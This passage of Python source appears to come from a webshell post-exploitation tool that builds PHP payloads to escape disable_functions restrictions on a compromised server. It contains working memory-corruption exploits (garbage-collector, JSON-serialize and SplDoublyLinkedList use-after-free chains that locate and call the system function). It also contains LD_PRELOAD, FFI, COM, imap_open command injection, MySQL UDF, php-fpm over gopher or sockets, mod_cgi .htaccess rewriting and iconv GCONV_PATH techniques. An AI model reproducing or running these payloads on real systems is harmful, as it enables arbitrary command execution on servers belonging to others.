            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    class ryat {
        var $ryat;
        var $chtg;
        function __destruct()
        {
            $this->chtg = $this->ryat;
            $this->ryat = 1;
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; # increase this value if you get segfaults

    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_repeat('A', 79);

    $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}';
    $out = unserialize($poc);
    gc_collect_cycles();

    $v = [];
    $v[0] = ptr2str(0, 79);
    unset($v);
    $abc = $out[2][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
    ob_start();
    ($helper->b)($cmd);
    $o=ob_get_contents();
    ob_end_clean();
    %s
    return $o;
}""" % (base64_encode(command), print_command)
    elif (bdf_mode == 3):  # php7-json
        return """$cmd = base64_decode("%s");
$n_alloc = 10; # increase this value if you get segfaults

class MySplFixedArray extends SplFixedArray {
    public static $leak;
}

class Z implements JsonSerializable {
    public function write(&$str, $p, $v, $n = 8) {
      $i = 0;
      for($i = 0; $i < $n; $i++) {
        $str[$p + $i] = chr($v & 0xff);
        $v >>= 8;
      }
    }

    public function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    public function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    # unable to leak ro segments
    public function leak1($addr) {
        global $spl1;

        $this->write($this->abc, 8, $addr - 0x10);
        return strlen(get_class($spl1));
    }

    # the real deal
    public function leak2($addr, $p = 0, $s = 8) {
        global $spl1, $fake_tbl_off;

        # fake reference zval
        # gc_refcounted
        $this->write($this->abc, $fake_tbl_off + 0x10, 0xdeadbeef);
        $this->write($this->abc, $fake_tbl_off + 0x18, $addr + $p - 0x10); # zval
        $this->write($this->abc, $fake_tbl_off + 0x20, 6); # type (string)

        $leak = strlen($spl1::$leak);
        if($s != 8) { $leak %%= 2 << ($s * 8) - 1; }

        return $leak;
    }

    public function parse_elf($base) {
        $e_type = $this->leak2($base, 0x10, 2);

        $e_phoff = $this->leak2($base, 0x20);
        $e_phentsize = $this->leak2($base, 0x36, 2);
        $e_phnum = $this->leak2($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = $this->leak2($header, 0, 4);
            $p_flags = $this->leak2($header, 4, 4);
            $p_vaddr = $this->leak2($header, 0x10);
            $p_memsz = $this->leak2($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    public function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = $this->leak2($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = $this->leak2($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = $this->leak2($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = $this->leak2($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    public function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = $this->leak2($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    public function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = $this->leak2($addr);
            $f_name = $this->leak2($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return $this->leak2($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    public function jsonSerialize() {
        global $y, $cmd, $spl1, $fake_tbl_off, $n_alloc;

        $contiguous = [];
        for($i = 0; $i < $n_alloc; $i++)
            $contiguous[] = new DateInterval('PT1S');

        $room = [];
        for($i = 0; $i < $n_alloc; $i++)
            $room[] = new Z();

        $_protector = $this->ptr2str(0, 78);

        $this->abc = $this->ptr2str(0, 79);
        $p = new DateInterval('PT1S');

        unset($y[0]);
        unset($p);

        $protector = ".$_protector";

        $x = new DateInterval('PT1S');
        $x->d = 0x2000;
        $x->h = 0xdeadbeef;
        # $this->abc is now of size 0x2000

        if($this->str2ptr($this->abc) != 0xdeadbeef) {
            die('UAF failed.');
        }

        $spl1 = new MySplFixedArray();
        $spl2 = new MySplFixedArray();

        # some leaks
        $class_entry = $this->str2ptr($this->abc, 0x120);
        $handlers = $this->str2ptr($this->abc, 0x128);
        $php_heap = $this->str2ptr($this->abc, 0x1a8);
        $abc_addr = $php_heap - 0x218;

        # create a fake class_entry
        $fake_obj = $abc_addr;
        $this->write($this->abc, 0, 2); # type
        $this->write($this->abc, 0x120, $abc_addr); # fake class_entry

        # copy some of class_entry definition
        for($i = 0; $i < 16; $i++) {
            $this->write($this->abc, 0x10 + $i * 8,
                $this->leak1($class_entry + 0x10 + $i * 8));
        }

        # fake static members table
        $fake_tbl_off = 0x70 * 4 - 16;
        $this->write($this->abc, 0x30, $abc_addr + $fake_tbl_off);
        $this->write($this->abc, 0x38, $abc_addr + $fake_tbl_off);

        # fake zval_reference
        # zval
        $this->write($this->abc, $fake_tbl_off, $abc_addr + $fake_tbl_off + 0x10);
        # zval type (reference)
        $this->write($this->abc, $fake_tbl_off + 8, 10);

        # look for binary base
        $binary_leak = $this->leak2($handlers + 0x10);
        if(!($base = $this->get_binary_base($binary_leak))) {
            die("Couldn't determine binary base address");
        }

        # parse elf header
        if(!($elf = $this->parse_elf($base))) {
            die("Couldn't parse ELF");
        }

        # get basic_functions address
        if(!($basic_funcs = $this->get_basic_funcs($base, $elf))) {
            die("Couldn't get basic_functions address");
        }

        # find system entry
        if(!($zif_system = $this->get_system($basic_funcs))) {
            die("Couldn't get zif_system address");
        }

        # copy hashtable offsetGet bucket
        $fake_bkt_off = 0x70 * 5 - 16;

        $function_data = $this->str2ptr($this->abc, 0x50);
        for($i = 0; $i < 4; $i++) {
            $this->write($this->abc, $fake_bkt_off + $i * 8,
                $this->leak2($function_data + 0x40 * 4, $i * 8));
        }

        # create a fake bucket
        $fake_bkt_addr = $abc_addr + $fake_bkt_off;
        $this->write($this->abc, 0x50, $fake_bkt_addr);
        for($i = 0; $i < 3; $i++) {
            $this->write($this->abc, 0x58 + $i * 4, 1, 4);
        }

        # copy bucket zval
        $function_zval = $this->str2ptr($this->abc, $fake_bkt_off);
        for($i = 0; $i < 12; $i++) {
            $this->write($this->abc,  $fake_bkt_off + 0x70 + $i * 8,
                $this->leak2($function_zval, $i * 8));
        }

        # pwn
        $this->write($this->abc, $fake_bkt_off + 0x70 + 0x30, $zif_system);
        $this->write($this->abc, $fake_bkt_off, $fake_bkt_addr + 0x70);
        ob_start();
        $spl1->offsetGet($cmd);
        $o=ob_get_contents();
        ob_end_clean();
        %s
        $GLOBAL['o']=$o;
    }
}

$y = [new Z()];
json_encode([&$y]);
$o=$GLOBAL['o'];""" % (base64_encode(command), print_command)
    elif (bdf_mode == 4):  # LD_PRELOAD
        ld_preload_func = gget("webshell.ld_preload_func", "webshell")
        ld_preload_command = ""
        if (ld_preload_func == "mail"):
            ld_preload_command = "mail('','','','');"
        elif (ld_preload_func == "error_log"):
            ld_preload_command = "error_log('',1);"
        elif (ld_preload_func == "mb_send_mail"):
            ld_preload_command = "mb_send_mail('','','');"
        elif (ld_preload_func == "imap_mail"):
            ld_preload_command = 'imap_mail("1@a.com","0","1","2","3");'
        return """$p="/tmp/%s";
putenv("cmd=".base64_decode("%s"));
putenv("rpath=$p");
putenv("LD_PRELOAD=%s");
%s
$o=file_get_contents($p);
unlink($p);
%s""" % (str(uuid4()),
         base64_encode(command),
         gget("webshell.ld_preload_path", "webshell"),
         ld_preload_command,
         print_command)
    elif (bdf_mode == 5):  # FFI
        return """$f=FFI::cdef("void *popen(const char *command, const char *type);
int pclose(void * stream);
int fgetc (void *fp);","libc.so.6");
$o=$f->popen(base64_decode("%s"),"r");
$d="";while(($c=$f->fgetc($o))!=-1)
{$d.=str_pad(strval(dechex($c)),2,"0",0);}
$f->pclose($o);
$o=hex2bin($d);
%s""" % (base64_encode(command), print_command)
    elif (bdf_mode == 6):  # COM
        return """$wsh = new COM('WScript.shell');
$exec = $wsh->exec("cmd /c ".base64_decode("%s"));
$stdout = $exec->StdOut();
$o = $stdout->ReadAll();
%s""" % (base64_encode(command), print_command)
    elif (bdf_mode == 7):  # imap_open
        tmpname = str(uuid4())
        return """if (!function_exists('imap_open')) {print("no imap_open function!");}
else{$server = "x -oProxyCommand=echo\\t" . base64_encode(base64_decode("%s") . ">/tmp/%s") . "|base64\\t-d|sh}";
imap_open('{' . $server . ':143/imap}INBOX', '', '');
sleep(1);
$o=file_get_contents("/tmp/%s");
%s
unlink("/tmp/%s");}""" % (base64_encode(command), tmpname, tmpname, print_command, tmpname)
    elif (bdf_mode == 8):  # MYSQL-UDF
        connect_type = gget("db_connect_type", "webshell")
        if (connect_type == "pdo"):
            return """try{%s
$r=$con->query("select sys_eval(unhex('%s'))");
$rr=$r->fetch();
$o=$rr[0];
$GLOBAL['o']=$o;
%s
} catch (PDOException $e){
}""" % (get_db_connect_code(), hex_encode(command), print_command)
        elif (connect_type == "mysql"):
            return """%s
if ($con)
{
$r=$con->query(select sys_eval(unhex('%s')));
$rr=$r->fetch_all(MYSQLI_NUM);
$o=$rr[0];
$GLOBAL['o']=$o;
%s
$r->close();
$con->close();
}""" % (get_db_connect_code(), hex_encode(command), print_command)
    elif (bdf_mode == 9):  # php7-SplDoublyLinkedList
        return """error_reporting(E_ALL);

define('NB_DANGLING', 200);
define('SIZE_ELEM_STR', 40 - 24 - 1);
define('STR_MARKER', 0xcf5ea1);

function i2s(&$s, $p, $i, $x=8)
{
    for($j=0;$j<$x;$j++)
    {
        $s[$p+$j] = chr($i & 0xff);
        $i >>= 8;
    }
}


function s2i(&$s, $p, $x=8)
{
    $i = 0;

    for($j=$x-1;$j>=0;$j--)
    {
        $i <<= 8;
        $i |= ord($s[$p+$j]);
    }

    return $i;
}


class UAFTrigger
{
    function __construct($cmd)
    {
        $this->cmd=$cmd;
    }
    function __destruct()
    {
        global $dlls, $strs, $rw_dll, $fake_dll_element, $leaked_str_offsets;

        $dlls[NB_DANGLING]->offsetUnset(0);

        # At this point every $dll->current points to the same freed chunk. We allocate
        # that chunk with a string, and fill the zval part
        $fake_dll_element = str_shuffle(str_repeat('A', SIZE_ELEM_STR));
        i2s($fake_dll_element, 0x00, 0x12345678); # ptr
        i2s($fake_dll_element, 0x08, 0x00000004, 7); # type + other stuff

        # Each of these dlls current->next pointers point to the same location,
        # the string we allocated. When calling next(), our fake element becomes
        # the current value, and as such its rc is incremented. Since rc is at
        # the same place as zend_string.len, the length of the string gets bigger,
        # allowing to R/W any part of the following memory
        for($i = 0; $i <= NB_DANGLING; $i++)
            $dlls[$i]->next();

        if(strlen($fake_dll_element) <= SIZE_ELEM_STR)
            die('Exploit failed: fake_dll_element did not increase in size');

        $leaked_str_offsets = [];
        $leaked_str_zval = [];

        # In the memory after our fake element, that we can now read and write,
        # there are lots of zend_string chunks that we allocated. We keep three,
        # and we keep track of their offsets.
        for($offset = SIZE_ELEM_STR + 1; $offset <= strlen($fake_dll_element) - 40; $offset += 40)
        {
            # If we find a string marker, pull it from the string list
            if(s2i($fake_dll_element, $offset + 0x18) == STR_MARKER)
            {
                $leaked_str_offsets[] = $offset;
                $leaked_str_zval[] = $strs[s2i($fake_dll_element, $offset + 0x20)];
                if(count($leaked_str_zval) == 3)
                    break;
            }
        }

        if(count($leaked_str_zval) != 3)
            die('Exploit failed: unable to leak three zend_strings');

        # free the strings, except the three we need
        $strs = null;

        # Leak adress of first chunk
        unset($leaked_str_zval[0]);
        unset($leaked_str_zval[1]);
        unset($leaked_str_zval[2]);
        $first_chunk_addr = s2i($fake_dll_element, $leaked_str_offsets[1]);

        # At this point we have 3 freed chunks of size 40, which we can read/write,
        # and we know their address.

        # In the third one, we will allocate a DLL element which points to a zend_array
        $rw_dll->push([3]);
        $array_addr = s2i($fake_dll_element, $leaked_str_offsets[2] + 0x18);
        # Change the zval type from zend_object to zend_string
        i2s($fake_dll_element, $leaked_str_offsets[2] + 0x20, 0x00000006);
        if(gettype($rw_dll[0]) != 'string')
            die('Exploit failed: Unable to change zend_array to zend_string');

        # We can now read anything: if we want to read 0x11223300, we make zend_string*
        # point to 0x11223300-0x10, and read its size using strlen()

        # Read zend_array->pDestructor
        $zval_ptr_dtor_addr = read($array_addr + 0x30);


        # Use it to find zif_system
        $system_addr = get_system_address($zval_ptr_dtor_addr);

        # In the second freed block, we create a closure and copy the zend_closure struct
        # to a string
        $rw_dll->push(function ($x) {});
        $closure_addr = s2i($fake_dll_element, $leaked_str_offsets[1] + 0x18);
        $data = str_shuffle(str_repeat('A', 0x200));

        for($i = 0; $i < 0x138; $i += 8)
        {
            i2s($data, $i, read($closure_addr + $i));
        }

        # Change internal func type and pointer to make the closure execute system instead
        i2s($data, 0x38, 1, 4);
        i2s($data, 0x68, $system_addr);

        # Push our string, which contains a fake zend_closure, in the last freed chunk that
        # we control, and make the second zval point to it.
        $rw_dll->push($data);
        $fake_zend_closure = s2i($fake_dll_element, $leaked_str_offsets[0] + 0x18) + 24;
        i2s($fake_dll_element, $leaked_str_offsets[1] + 0x18, $fake_zend_closure);

        # Calling it now
        ob_start();
        $rw_dll[1]($this->cmd);
        $o=ob_get_contents();
        ob_end_clean();
        %s
    }
}

class DanglingTrigger
{
    function __construct($i)
    {
        $this->i = $i;
    }

    function __destruct()
    {
        global $dlls;
        $dlls[$this->i]->offsetUnset(0);
        $dlls[$this->i+1]->push(123);
        $dlls[$this->i+1]->offsetUnset(0);
    }
}

class SystemExecutor extends ArrayObject
{
    function offsetGet($x)
    {
        parent::offsetGet($x);
    }
}

/**
 * Reads an arbitrary address by changing a zval to point to the address minus 0x10,
 * and setting its type to zend_string, so that zend_string->len points to the value
 * we want to read.
 */
function read($addr, $s=8)
{
    global $fake_dll_element, $leaked_str_offsets, $rw_dll;

    i2s($fake_dll_element, $leaked_str_offsets[2] + 0x18, $addr - 0x10);
    i2s($fake_dll_element, $leaked_str_offsets[2] + 0x20, 0x00000006);

    $value = strlen($rw_dll[0]);

    if($s != 8)
        $value &= (1 << ($s << 3)) - 1;

    return $value;
}

function get_binary_base($binary_leak)
{
    $base = 0;
    $start = $binary_leak & 0xfffffffffffff000;
    for($i = 0; $i < 0x1000; $i++)
    {
        $addr = $start - 0x1000 * $i;
        $leak = read($addr, 7);
        # ELF header
        if($leak == 0x10102464c457f)
            return $addr;
    }
    # We'll crash before this but it's clearer this way
    die('Exploit failed: Unable to find ELF header');
}

function parse_elf($base)
{
    $e_type = read($base + 0x10, 2);

    $e_phoff = read($base + 0x20);
    $e_phentsize = read($base + 0x36, 2);
    $e_phnum = read($base + 0x38, 2);

    for($i = 0; $i < $e_phnum; $i++) {
        $header = $base + $e_phoff + $i * $e_phentsize;
        $p_type  = read($header + 0x00, 4);
        $p_flags = read($header + 0x04, 4);
        $p_vaddr = read($header + 0x10);
        $p_memsz = read($header + 0x28);

        if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
            # handle pie
            $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
            $data_size = $p_memsz;
        } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
            $text_size = $p_memsz;
        }
    }

    if(!$data_addr || !$text_size || !$data_size)
        die('Exploit failed: Unable to parse ELF');

    return [$data_addr, $text_size, $data_size];
}

function get_basic_funcs($base, $elf) {
    list($data_addr, $text_size, $data_size) = $elf;
    for($i = 0; $i < $data_size / 8; $i++) {
        $leak = read($data_addr + $i * 8);
        if($leak - $base > 0 && $leak < $data_addr) {
            $deref = read($leak);
            # 'constant' constant check
            if($deref != 0x746e6174736e6f63)
                continue;
        } else continue;

        $leak = read($data_addr + ($i + 4) * 8);
        if($leak - $base > 0 && $leak < $data_addr) {
            $deref = read($leak);
            # 'bin2hex' constant check
            if($deref != 0x786568326e6962)
                continue;
        } else continue;

        return $data_addr + $i * 8;
    }
}

function get_system($basic_funcs)
{
    $addr = $basic_funcs;
    do {
        $f_entry = read($addr);
        $f_name = read($f_entry, 6);

        if($f_name == 0x6d6574737973) { # system
            return read($addr + 8);
        }
        $addr += 0x20;
    } while($f_entry != 0);
    return false;
}

function get_system_address($binary_leak)
{
    $base = get_binary_base($binary_leak);
    $elf = parse_elf($base);
    $basic_funcs = get_basic_funcs($base, $elf);
    $zif_system = get_system($basic_funcs);
    return $zif_system;
}

define('NB_STRS', 50);

$dlls = [];
$strs = [];
$rw_dll = new SplDoublyLinkedList();


# Create a chain of dangling triggers, which will all in turn
# free current->next, push an element to the next list, and free current
# This will make sure that every current->next points the same memory block,
# which we will UAF.
for($i = 0; $i < NB_DANGLING; $i++)
{
    $dlls[$i] = new SplDoublyLinkedList();
    $dlls[$i]->push(new DanglingTrigger($i));
    $dlls[$i]->rewind();
}

# We want our UAF'd list element to be before two strings, so that we can
# obtain the address of the first string, and increase is size. We then have
# R/W over all memory after the obtained address.

for($i = 0; $i < NB_STRS; $i++)
{
    $strs[] = str_shuffle(str_repeat('A', SIZE_ELEM_STR));
    i2s($strs[$i], 0, STR_MARKER);
    i2s($strs[$i], 8, $i, 7);
}

# Free one string in the middle, ...
$strs[NB_STRS - 20] = 123;
# ... and put the to-be-UAF'd list element instead.
$dlls[0]->push(0);

# Setup the last DLlist, which will exploit the UAF
$dlls[NB_DANGLING] = new SplDoublyLinkedList();
$dlls[NB_DANGLING]->push(new UAFTrigger(base64_decode("%s")));
$dlls[NB_DANGLING]->rewind();

# Trigger the bug on the first list
$dlls[0]->offsetUnset(0);""" % (print_command, base64_encode(command))
    elif (bdf_mode == 10):  # php-fpm
        bits = gget("webshell.arch", "webshell")
        is_win = gget("webshell.is_win", "webshell")
        ext_local_path = path.join(gget("root_path"), "auxiliary", "fpm")
        ext_name = "ant_x"
        ext_ext = ""
        if bits == 0:
            return """print("architecture error\\n");"""
        elif bits == 32:
            ext_name += "86."
        else:
            ext_name += "64."
        if is_win:
            ext_ext = "dll"
        else:
            ext_ext = "so"
        tmp_dir = gget("webshell.upload_tmp_dir",
                       "webshell").rstrip("/").rstrip("\\")
        directory_separator = gget("webshell.directory_separator", "webshell")
        ext_upload_path = tmp_dir + directory_separator + \
            str(uuid4()) + "." + ext_ext
        response_file = tmp_dir + directory_separator + randstr(ascii_letters)
        command += " > " + response_file

        ext_name += ext_ext
        ext_local_path = path.join(ext_local_path, ext_name)
        ext_bytes = generate_extension(ext_name, ext_local_path, command)

        phpcode = f"file_put_contents('{ext_upload_path}', base64_decode('{b64encode(ext_bytes).decode()}'));\n"
        attack_type = gget("webshell.bdf_fpm.type", "webshell")
        host = gget("webshell.bdf_fpm.host", "webshell")
        port = gget("webshell.bdf_fpm.port", "webshell")
        sleep_time = 1

        if attack_type == "gopher":
            phpcode += """function curl($url){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_exec($ch);
curl_close($ch);
}
ob_start();curl("%s");$o=ob_get_clean();%s
""" % (generate_ssrf_payload(host, port, ext_upload_path), print_command)
        elif attack_type in ["sock", "http_sock"]:
            sock_path = gget("webshell.bdf_fpm.sock_path", "webshell")
            phpcode += """
$sock_path='%s';
$host='%s';
$port=%s;
""" % (sock_path, host, port)

            if attack_type == "sock":
                phpcode += """if(function_exists('stream_socket_client') && file_exists($sock_path)){
$sock=stream_socket_client("unix://".$sock_path);
} else {
die('stream_socket_client function not exist or sock not exist');
}"""
            else:
                phpcode += """if(function_exists('fsockopen')){
                $sock=fsockopen($host, $port, $errno, $errstr, 1);
            } else if(function_exists('pfsockopen')){
                $sock=pfsockopen($host, $port, $errno, $errstr, 1);
            } else if(function_exists('stream_socket_client')) {
                $sock=stream_socket_client("tcp://$sock_path:$port",$errno, $errstr, 1);
            } else {
                die('fsockopen/pfsockopen/stream_socket_client function not exist');
            }"""
            phpcode += "fwrite($sock, base64_decode('%s'));" % (
                generate_base64_socks_payload(host, port, ext_upload_path))
        elif attack_type == "ftp":
            random_ftp_port = randint(60000, 65000)
            phpcode += """if(function_exists('stream_socket_server') && function_exists('stream_socket_accept')){
$ftp_table = [
    "USER" => "331 Username ok, send password.\\r\\n",
    "PASS" => "230 Login successful.\\r\\n",
    "TYPE" => "200 Type set to: Binary.\\r\\n",
    "SIZE" => "550 /test is not retrievable.\\r\\n",
    "EPSV" => "500 'EPSV': command not understood.\\r\\n",
    "PASV" => "227 Entering passive mode (%s,0,%s).\\r\\n",
    "STOR" => "150 File status okay. About to open data connection.\\r\\n",
];
$server = stream_socket_server("tcp://0.0.0.0:%s", $errno, $errstr);
$accept = stream_socket_accept($server);
fwrite($accept, "200 OK\\r\\n");
while (true) {
    $data = fgets($accept);
    $cmd = substr($data, 0, 4);
    if (array_key_exists($cmd, $ftp_table)) {
        fwrite($accept, $ftp_table[$cmd]);
        if ($cmd === "STOR") {
            break;
        }
    } else {
        break;
    }
}
fclose($server);
} else {
die('stream_socket_server/stream_socket_accept function not exist');
}""" % (host.replace(".", ","), port, random_ftp_port)

            t = Thread(target=send, kwargs={
                       "phpcode": phpcode, "_in_system_command": True})
            t.setDaemon(True)
            t.start()
            sleep(0.2)

            phpcode = "var_dump(file_put_contents('ftp://%s:%s/a', base64_decode('%s')));" % (
                host, random_ftp_port, generate_base64_socks_payload(host, port, ext_upload_path))

            send(phpcode, _in_system_command=True)
            phpcode = ""
            sleep_time = 0.8
        else:
            phpcode += "die('unknown attack type');"

        phpcode += f"sleep({sleep_time});$o=file_get_contents('{response_file}');unlink('{ext_upload_path}');unlink('{response_file}');{print_command}"
        return phpcode
    elif (bdf_mode == 11):  # apache_mod_cgi
        shellscript_name = randstr(ALPATHNUMERIC, 8) + ".dh"
        res = send("""$cmd = base64_decode("%s");
$shellcode = "#!/bin/sh\\n";
$shellcode .= base64_decode("ZWNobyAtbmUgIkNvbnRlbnQtVHlwZTogdGV4dC9odG1sXG5cbiIK");
$shellcode .= "$cmd";
$f=__DIR__.DIRECTORY_SEPARATOR."%s";
rename(__DIR__.DIRECTORY_SEPARATOR.".htaccess", __DIR__.DIRECTORY_SEPARATOR.".htaccess.bak");
file_put_contents(__DIR__.DIRECTORY_SEPARATOR.'.htaccess', "Options +ExecCGI\\nAddHandler cgi-script .dh");
file_put_contents($f, $shellcode);
chmod($f, 0777);
print($f);
""" % (base64_encode(command), shellscript_name))
        real_shellscript_name = res.r_text

        # get shellscript url
        webshell_url = gget("webshell.url", namespace="webshell")
        parsed = list(urlparse(webshell_url))
        webshell_path = parsed[2]
        shellscript_path = "/" + \
            "/".join(webshell_path.split("/")[:-1]) + shellscript_name
        parsed[2] = shellscript_path
        shellscript_url = urlunparse(parsed)

        # request shellscript url and get result
        res = requests.get(shellscript_url)
        o = base64_encode(res.text.strip())
        phpcode = """$o=base64_decode('%s');%sunlink('%s');unlink(__DIR__.DIRECTORY_SEPARATOR.".htaccess");rename(__DIR__.DIRECTORY_SEPARATOR.".htaccess.bak", __DIR__.DIRECTORY_SEPARATOR.".htaccess");""" % (
            o, print_command, real_shellscript_name)
        return phpcode
    elif (bdf_mode == 12):  # iconv
        p = "/tmp/%s" % randstr(ALPATHNUMERIC, 8)
        pre_phpcode = """$p="%s";
putenv("GCONV_PATH=/tmp/");
putenv("cmd=".base64_decode("%s"));
putenv("rpath=$p");
if(function_exists('iconv')){
    iconv("payload", "UTF-8", "whatever");
} else if(function_exists('iconv_strlen')) {
    iconv_strlen("1","payload");
}
""" % (p, base64_encode(command))
        send(pre_phpcode, quiet=True)
        phpcode = """$p="%s";sleep(1);$o=file_get_contents($p);unlink($p);%s""" % (
            p, print_command)

        return phpcode
    elif (bdf_mode == 13):  # FFI-php_exec
        return """$f=FFI::cdef("int php_exec(int type, char *cmd);");
ob_start();$f->php_exec(3,base64_decode("%s"));$o=ob_get_contents();ob_end_clean();
%s""" % (base64_encode(command), print_command)
    elif (bdf_mode == 14):  # php7-reflectionProperty
        return """global $abc, $helper;
        class Test {
        public HelperHelperHelperHelperHelperHelperHelper $prop;
        }
        class HelperHelperHelperHelperHelperHelperHelper {
        public $a, $b;
        }
        function s2n($str) {
        $address = 0;
        for ($i=0;$i<4;$i++){
        $address <<= 8;
        $address |= ord($str[4 + $i]);
        }
        return $address;
        }
        function s2b($str, $offset){
        return hex2bin(str_pad(dechex(s2n($str) + $offset - 0x10), 8, "0",
        STR_PAD_LEFT));
        }
        function leak($offset) {
        global $abc;
        $data = "";
        for ($i = 0;$i < 8;$i++){
        $data .= $abc[$offset + 7 - $i];
        }
        return $data;
        }
        function leak2($address) {
        global $helper;
        write(0x20, $address);
        $leak = strlen($helper -> b);
        $leak = dechex($leak);
        $leak = str_pad($leak, 16, "0", STR_PAD_LEFT);
        $leak = hex2bin($leak);
        return $leak;
        }
        function write($offset, $data) {
        global $abc;
        $data = str_pad($data, 8, "\\x00", STR_PAD_LEFT);
        for ($i = 0;$i < 8;$i++){
        $abc[$offset + $i] = $data[7 - $i];
        }
        }
        function get_basic_funcs($std_object_handlers) {
        $prefix = substr($std_object_handlers, 0, 4);
        $std_object_handlers = hexdec(bin2hex($std_object_handlers));
        $start = $std_object_handlers & 0x00000000fffff000 | 0x0000000000000920; # change 0x920 if finding failed
        $NumPrefix = $std_object_handlers & 0x0000ffffff000000;
        $NumPrefix = $NumPrefix - 0x0000000001000000;
        $funcs = get_defined_functions()['internal'];
        for($i = 0; $i < 0x1000; $i++) {
        $addr = $start - 0x1000 * $i;
        $name_addr = bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10), 8,
        "0", STR_PAD_LEFT))));
        if (hexdec($name_addr) > $std_object_handlers || hexdec($name_addr) < $NumPrefix)
        {
        continue;
        }
        $name_addr = str_pad($name_addr, 16, "0", STR_PAD_LEFT);
